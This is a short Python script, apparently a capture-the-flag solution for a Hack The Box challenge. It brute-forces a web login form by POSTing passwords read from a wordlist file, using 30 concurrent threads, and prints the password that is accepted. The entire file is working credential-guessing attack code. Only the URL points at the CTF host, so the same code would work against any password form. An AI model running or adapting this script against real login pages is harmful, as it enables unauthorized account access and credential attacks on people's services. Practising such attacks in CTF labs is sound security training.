import time

import requests
from concurrent.futures.thread import ThreadPoolExecutor
from threading import Lock

session = requests.session()
counter = 0
lock = Lock()


def main():
    start = int(round(time.time() * 1000))
    with open("passwords.txt") as file:
        line_list = file.readlines()
        index = range(len(line_list))
    with ThreadPoolExecutor(max_workers=30) as executor:
        executor.map(brute_force, index, line_list)
    print(f"Total: {int(round(time.time() * 1000)) - start}")


def brute_force(index, password):
    payload = {
        'password': password
    }
    response = session.post('http://docker.hackthebox.eu:43637/', payload)
    if response.content.decode().startswith("Invalid password!"):
        if index % 50 == 0:
            print(index)
    else:
        print(password)
        raise SystemExit


if __name__ == '__main__':
    main()
